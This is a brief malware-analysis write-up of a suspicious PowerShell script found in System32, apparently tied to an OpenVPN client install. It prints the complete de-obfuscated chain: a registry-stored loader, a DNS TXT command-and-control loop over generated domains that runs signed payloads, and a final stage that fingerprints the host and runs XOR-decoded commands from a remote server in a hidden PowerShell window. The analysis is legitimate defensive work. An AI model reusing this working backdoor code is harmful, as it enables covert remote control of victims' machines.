# OpenVPN Client Hardware Scraper Analysis

While performing some analysis on redacted7's auth, I discovered some strange get requests to a remote endpoint. 

![image](https://user-images.githubusercontent.com/113079075/198914096-cf76fe0a-aff5-478e-be2d-84f2bae9918a.png)

After seeing this, and looking and noticing that they come from a powershell script. I was immediately concerned. 

![image](https://user-images.githubusercontent.com/113079075/198914127-4395af66-e235-44eb-bd59-85ac64fd8bc9.png)

After doing some more research, I discovered very little about what the domain actually did. Performing a GET request to the root url returned null data, as did to the api epndpoint used by the script. The who.is database contained very little data about who it actually belonged to and what its perpose was. Upon searching the filesystem, I uncovered a rouge script inside the System32 directory. This immediately peaked my interest.

![image](https://user-images.githubusercontent.com/113079075/198914463-35f7f7cb-507e-49d8-9550-119301f75b6a.png)

The script contained the follwing code.

```
$czVZpFwMSHi=[ScriptBlock];$xXWoPBkIxK=[string];$xSQEihUBlT=[char]; icm ($czVZpFwMSHi::Create($xXWoPBkIxK::Join('', ((gp 'HKLM:\SOFTWARE\OpenVPNConnect.exewfh95b').'irUUcHjDrrj' | % { [char]$_ }))))
```

This got me excited. I could see that it was pulling something from a registry key, and executing it using ICM. Not wanting to investigate the registry key, I decided to just take the inner part out of the ICM function and run it seperately. This gave me the following script.

```
$ms = [IO.MemoryStream]::new();

function Get-Updates {
    param (
        $hostname
    )
    try {
        $dns = Resolve-DnsName -Name $hostname -Type 'TXT'
        $ms.SetLength(0);
        $ms.Position = 0;
        foreach ($txt in $dns) {
            try {
                if ($txt.Type -ne 'TXT') {
                    continue;
                }
                $pkt = [string]::Join('', $txt.Strings);
                if ($pkt[0] -eq '.') {
                    $dp = [System.Convert]::FromBase64String($pkt.Substring(1).Replace('_', '+'));
                    $ms.Position = [BitConverter]::ToUInt32($dp, 0);
                    $ms.Write($dp, 4, $dp.Length - 4);
                }
            }
            catch {
            }
        }

        if ($ms.Length -gt 136) {
            $ms.Position = 0;
            $sig = [byte[]]::new(128);
            $timestamp = [byte[]]::new(8);
            $buffer = [byte[]]::new($ms.Length - 136);
            $ms.Read($sig, 0, 128) | Out-Null;
            $ms.Read($timestamp, 0, 8) | Out-Null;
            $ms.Read($buffer, 0, $buffer.Length) | Out-Null;
            $pubkey = [Security.Cryptography.RSACryptoServiceProvider]::new();
            [byte[]]$bytarr = 6,2,0,0,0,164,0,0,82,83,65,49,0,4,0,0,1,0,1,0,171,136,19,139,215,31,169,242,133,11,146,105,79,13,140,88,119,0,2,249,79,17,77,152,228,162,31,56,117,89,68,182,194,170,250,16,3,78,104,92,37,37,9,250,164,244,195,118,92,190,58,20,35,134,83,10,229,114,229,137,244,178,10,31,46,80,221,73,129,240,183,9,245,177,196,77,143,71,142,60,5,117,241,54,2,116,23,225,145,53,46,21,142,158,206,250,181,241,8,110,101,84,218,219,99,196,195,112,71,93,55,111,218,209,12,101,165,45,13,36,118,97,232,193,245,221,180,169
            $pubkey.ImportCspBlob($bytarr);
            if ($pubkey.VerifyData($buffer, [Security.Cryptography.CryptoConfig]::MapNameToOID('SHA256'), $sig)) {
                return @{
                    timestamp = ([System.BitConverter]::ToUInt64($timestamp, 0));
                    text      = ([Text.Encoding]::UTF8.GetString($buffer));
                };
            }
        }
    }
    catch {
    }
    return $null;
}

while ($true) {
    try {
        $update = @{
            timestamp = 0;
            text      = '';
        };
        foreach ($c in (@("com", "xyz"))) {
            foreach ($a in (@("wmail", "fairu", "bideo", "privatproxy", "ahoravideo"))) {
                foreach ($b in (@("endpoint", "blog", "chat", "cdn", "schnellvpn"))) {
                    try {
                        $h = "$a-$b.$c";
                        $r = Get-Updates $h
                        if ($null -ne $r) {
                            if ($r.timestamp -gt $update.timestamp) {
                                $update = $r;
                            }
                        }
                    }
                    catch {
                    }
                }
            }
        }

        if ($update.text) {
            $job = Start-Job -ScriptBlock ([scriptblock]::Create($update.text));
            $job | Wait-Job -Timeout 14400;
            $job | Stop-Job;
        }
    }
    catch {
    }
    Start-Sleep -Seconds 30;
}
```

Now we are getting somewhere. I could see a block of data inside a function named "Get-Updates", but as far as I could see, it didnt do alot. There was some weird domain names in an infinte loop later down the script, and it was confusing what exactly they did. It looked like that it checked a list of domains using the Get-Updates function, and set the update variable depending on the timestamp. Further down the script, another script block could be found, and I decided to execute the script after replacing the execution line to write the output to console. After performing the strange DNS checks seen in the infinite loop, the following script was produced. 

```
[Security.Cryptography.SHA256]$sha = [Security.Cryptography.SHA256]::Create()
$macguid = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Cryptography' -Name MachineGuid).MachineGUID;
$userid = "$($env:USERDOMAIN)$($env:USERNAME)$($env:PROCESSOR_REVISION)$($env:PROCESSOR_IDENTIFIER)$($env:PROCESSOR_LEVEL)$($env:NUMBER_OF_PROCESSORS)$($macguid)";
$guid = ($sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($userid)) | ForEach-Object ToString X2) -join '';
while ($true) {
    try {
        $r = Invoke-RestMethod -Uri "http://cesareurope.com/api/v1/$($guid)"
        if ($r -ne '') {
            $buf = [Convert]::FromBase64String($r);
            for ($i = 0; $i -lt $buf.Length; $i++) {
                $buf[$i] = $buf[$i] -bxor 22;
            }
            $lines = [Text.Encoding]::ASCII.GetString($buf).Split("`r`n");
            $p = [Diagnostics.Process]::new();
            $p.StartInfo.WindowStyle = 'Hidden';
            $p.StartInfo.FileName = 'powershell.exe';
            $p.StartInfo.UseShellExecute = $false;
            $p.StartInfo.RedirectStandardInput = $true;
            $p.StartInfo.RedirectStandardOutput = $true;
            $p.Start();
            $p.BeginOutputReadLine();
            foreach ($line in $lines) {
                $p.StandardInput.WriteLine($line);
            }
            $p.StandardInput.WriteLine('');
            $p.WaitForExit();
            break;
        }
    }
    catch {
    }
    Start-Sleep 2
}
```

This is it. Looks like we found the request that I was looking for. This is where it gets interesting. The data being sent to the servers endpoint doesnt look malicious at all. Just looks like hardware info, which is sent to the server. The recieved data is then base64 and xor decoded, and output to a hidden powershell window. This has been a very quick writeup as im doing this right before a big exam but whatever. Hope u enjoy whatever this does and feel free to look into it.

